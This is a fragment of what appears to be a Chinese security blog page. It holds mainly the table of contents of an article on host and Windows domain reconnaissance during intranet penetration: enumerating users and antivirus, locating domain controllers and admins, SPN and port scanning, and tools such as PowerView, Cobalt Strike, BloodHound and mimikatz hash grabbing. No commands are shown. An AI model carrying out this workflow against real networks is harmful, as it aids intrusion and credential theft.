href="#220-%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.20.</span> <span class="toc-text">2.20 查看进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#221-%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.21.</span> <span class="toc-text">2.21 查看启动程序信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#222-%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E9%9C%80%E8%A6%81%E9%AB%98%E6%9D%83%E9%99%90"><span class="toc-number">2.22.</span> <span class="toc-text">2.22 查看计划任务(需要高权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#223-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-number">2.23.</span> <span class="toc-text">2.23 查看主机开机时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#224-%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">2.24.</span> <span class="toc-text">2.24 查看本机用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#225-%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">2.25.</span> <span class="toc-text">2.25 获取本地管理员信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#226-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7"><span class="toc-number">2.26.</span> <span class="toc-text">2.26 查看当前在线用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#227-%E6%9F%A5%E7%9C%8B%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7"><span class="toc-number">2.27.</span> <span class="toc-text">2.27 查看在线用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#228-%E5%88%97%E5%87%BA%E6%96%AD%E5%BC%80%E6%9C%AC%E5%9C%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E6%89%80%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%AF%B9%E8%AF%9D%E9%9C%80%E8%A6%81%E9%AB%98%E6%9D%83%E9%99%90"><span class="toc-number">2.28.</span> <span class="toc-text">2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#229-%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-number">2.29.</span> <span class="toc-text">2.29 查询端口列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#230-%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8%E5%92%8C%E5%8F%AF%E8%AE%BF%E9%97%AE%E7%9A%84%E5%9F%9F%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8"><span class="toc-number">2.30.</span> <span class="toc-text">2.30 查看本机共享列表和可访问的域共享列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#231-%E6%9F%A5%E6%89%BE%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8"><span class="toc-number">2.31.</span> <span class="toc-text">2.31 查找共享列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#232-%E7%A3%81%E7%9B%98%E6%98%A0%E5%B0%84"><span class="toc-number">2.32.</span> <span class="toc-text">2.32 磁盘映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#233-%E6%9F%A5%E8%AF%A2%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="toc-number">2.33.</span> <span class="toc-text">2.33 查询路由表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#234-%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.34.</span> <span class="toc-text">2.34 查看远程连接信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#235-%E6%9F%A5%E7%9C%8B%E6%9D%80%E8%BD%AF"><span class="toc-number">2.35.</span> <span class="toc-text">2.35 查看杀软</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#236-%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-number">2.36.</span> <span class="toc-text">2.36 查看本地密码策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#237-%E6%9F%A5%E7%9C%8Bhosts%E6%96%87%E4%BB%B6"><span class="toc-number">2.37.</span> <span class="toc-text">2.37 查看hosts文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#238-%E6%9F%A5%E7%9C%8Bdns%E7%BC%93%E5%AD%98"><span class="toc-number">2.38.</span> <span class="toc-text">2.38 查看dns缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#239-%E5%B8%B8%E8%A7%81%E6%9F%A5%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.39.</span> <span class="toc-text">2.39 常见查毒软件进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#240-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.40.</span> <span class="toc-text">2.40 浏览器信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">0x03 域环境信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 判断是否存在域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8Dip"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 解析域名ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 查看当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E8%8E%B7%E5%8F%96%E5%9F%9Fsid"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 获取域SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%A6%E6%83%85%E4%BF%A1%E6%81%AF"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 查询指定用户的详情信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 查看域内所有账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-%E5%AF%B9%E6%AF%94%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%9F%9F%E5%90%8D%E5%92%8C%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%98%AF%E5%90%A6%E5%8C%B9%E9%85%8D"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-%E5%AF%B9%E6%AF%94%E6%9F%A5%E7%9C%8B%E5%B7%A5%E4%BD%9C%E7%AB%99%E5%9F%9Fdns%E5%90%8D%E7%A7%B0%E5%9F%9F%E5%90%8D%E5%92%8C%E7%99%BB%E5%BD%95%E5%9F%9F%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%98%AF%E5%90%A6%E7%9B%B8%E5%8C%B9%E9%85%8D"><span class="toc-number">3.8.</span> <span class="toc-text">3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#39-%E6%9F%A5%E7%9C%8B%E6%97%B6%E9%97%B4%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.9.</span> <span class="toc-text">3.9 查看时间可以找到域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#310-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-number">3.10.</span> <span class="toc-text">3.10 查看域密码策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#311-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E5%9F%9F"><span class="toc-number">3.11.</span> <span class="toc-text">3.11 查看当前登录域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#312-%E7%99%BB%E5%BD%95%E6%9C%AC%E6%9C%BA%E7%9A%84%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.12.</span> <span class="toc-text">3.12 登录本机的域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#313-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7ip"><span class="toc-number">3.13.</span> <span class="toc-text">3.13 获取域控ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#314-%E6%9F%A5%E8%AF%A2%E5%9F%9F"><span class="toc-number">3.14.</span> <span class="toc-text">3.14 查询域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#315-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E7%9A%84%E6%89%80%E6%9C%89%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">3.15.</span> <span class="toc-text">3.15 查询域内的所有计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#316-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%9A%84%E6%89%80%E6%9C%89%E7%BB%84enterprise-admins%E7%BB%84%E6%9D%83%E9%99%90%E6%9C%80%E5%A4%A7"><span class="toc-number">3.16.</span> <span class="toc-text">3.16 查询域的所有组（enterprise admins组权限最大）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#317-spn%E6%89%AB%E6%8F%8F"><span class="toc-number">3.17.</span> <span class="toc-text">3.17 SPN扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#318-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">3.18.</span> <span class="toc-text">3.18 查看域管理员的用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#319-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">3.19.</span> <span class="toc-text">3.19 查询域系统管理员用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#320-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">3.20.</span> <span class="toc-text">3.20 查看域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#321-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="toc-number">3.21.</span> <span class="toc-text">3.21 查看域控制器的机器名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#322-%E6%9F%A5%E7%9C%8Bdns%E7%BC%93%E5%AD%98"><span class="toc-number">3.22.</span> <span class="toc-text">3.22 查看dns缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#323-%E5%88%97%E5%9F%9F%E6%8E%A7c%E7%9B%98%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">3.23.</span> <span class="toc-text">3.23 列域控c盘文件(需要域管理员权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#324-%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E5%9F%9F%E6%88%90%E5%91%98%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%88%97%E8%A1%A8"><span class="toc-number">3.24.</span> <span class="toc-text">3.24 查询所有域成员计算机列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#325-%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">3.25.</span> <span class="toc-text">3.25 获取域信任信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#326-%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">3.26.</span> <span class="toc-text">3.26 获取域内用户的详细信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#327-%E6%9F%A5%E7%9C%8B%E5%AD%98%E5%9C%A8%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">3.27.</span> <span class="toc-text">3.27 查看存在的用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#328-%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%90%8D%E7%A7%B0"><span class="toc-number">3.28.</span> <span class="toc-text">3.28 查询所有计算机名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#329-%E6%94%BB%E5%87%BB%E4%B8%BB%E6%9C%BAcmd%E6%89%AB%E6%8F%8F%E5%90%8C%E7%BD%91%E6%AE%B5%E5%AD%98%E6%B4%BBip"><span class="toc-number">3.29.</span> <span class="toc-text">3.29 攻击主机CMD扫描同网段存活ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#330-powerviewps%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.30.</span> <span class="toc-text">3.30 PowerView.ps域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#331-cs%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.31.</span> <span class="toc-text">3.31 cs信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#target%E7%BB%84%E4%BF%A1%E6%81%AF%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.31.1.</span> <span class="toc-text">target组信息的命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%9B%AE%E5%BD%95"><span class="toc-number">3.31.2.</span> <span class="toc-text">获取远程目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E9%80%9A%E8%BF%87powershell%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">3.31.3.</span> <span class="toc-text">cs通过powershell命令获取目录信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E9%80%9A%E8%BF%87mimikatz%E6%8A%93%E5%8F%96%E8%BF%9C%E7%A8%8B%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">3.31.4.</span> <span class="toc-text">cs通过mimikatz抓取远程哈希值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#332-%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3"><span class="toc-number">3.32.</span> <span class="toc-text">3.32 防火墙相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#333-%E6%9F%A5%E8%AF%A2%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E6%83%85%E5%86%B5"><span class="toc-number">3.33.</span> <span class="toc-text">3.33 查询代理配置情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#334-%E6%9F%A5%E8%AF%A2%E5%B9%B6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.34.</span> <span class="toc-text">3.34 查询并开启远程连接服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#335-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.35.</span> <span class="toc-text">3.35 端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-telnet%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.35.1.</span> <span class="toc-text">1. telnet端口连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-powersploit-%E4%B8%AD%E7%9A%84invoke-portscanps1%E8%84%9A%E6%9C%AC"><span class="toc-number">3.35.2.</span> <span class="toc-text">2. PowerSploit 中的Invoke-portscan.ps1脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-nishang%E4%B8%AD%E7%9A%84invoke-portscanps1"><span class="toc-number">3.35.3.</span> <span class="toc-text">3. Nishang中的Invoke-portscan.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">3.35.4.</span> <span class="toc-text">4. Nmap扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-metasploit-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">3.35.5.</span> <span class="toc-text">5. Metasploit 端口扫描模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3%E7%9A%84banner%E4%BF%A1%E6%81%AF"><span class="toc-number">3.35.6.</span> <span class="toc-text">6. 收集域内端口的banner信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96banner"><span class="toc-number">3.35.7.</span> <span class="toc-text">获取Banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8nmap%E8%8E%B7%E5%8F%96banner"><span class="toc-number">3.35.8.</span> <span class="toc-text">7. 使用Nmap获取banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%BD%BF%E7%94%A8nc%E8%8E%B7%E5%8F%96banner"><span class="toc-number">3.35.9.</span> <span class="toc-text">8. 使用nc获取banner</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#336-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="toc-number">3.36.</span> <span class="toc-text">3.36 存活主机扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nbtscan"><span class="toc-number">3.36.1.</span> <span class="toc-text">nbtscan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ping"><span class="toc-number">3.36.2.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#arp-scanexe"><span class="toc-number">3.36.3.</span> <span class="toc-text">arp-scan.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC"><span class="toc-number">3.36.4.</span> <span class="toc-text">批处理脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F"><span class="toc-number">3.36.5.</span> <span class="toc-text">msf主机存活扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#337-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.37.</span> <span class="toc-text">3.37 定位域管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#psloggeddonexe"><span class="toc-number">3.37.1.</span> <span class="toc-text">psloggeddon.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pvefindaduserexe"><span class="toc-number">3.37.2.</span> <span class="toc-text">PVEFindADUser.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powerviewps1"><span class="toc-number">3.37.3.</span> <span class="toc-text">powerview.ps1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#338-empire%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.38.</span> <span class="toc-text">3.38 Empire信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#339-powersploit-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.39.</span> <span class="toc-text">3.39 powersploit 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#340-%E7%BF%BB%E7%BF%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.40.</span> <span class="toc-text">3.40 翻翻配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#341-bloodhound%E5%9F%9F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">3.41.</span> <span class="toc-text">3.41 BloodHound域分析工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">3.41.1.</span> <span class="toc-text">配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#342-%E4%BD%BF%E7%94%A8empire%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">3.42.</span> <span class="toc-text">3.42 使用empire收集信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">四、参考文章：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a 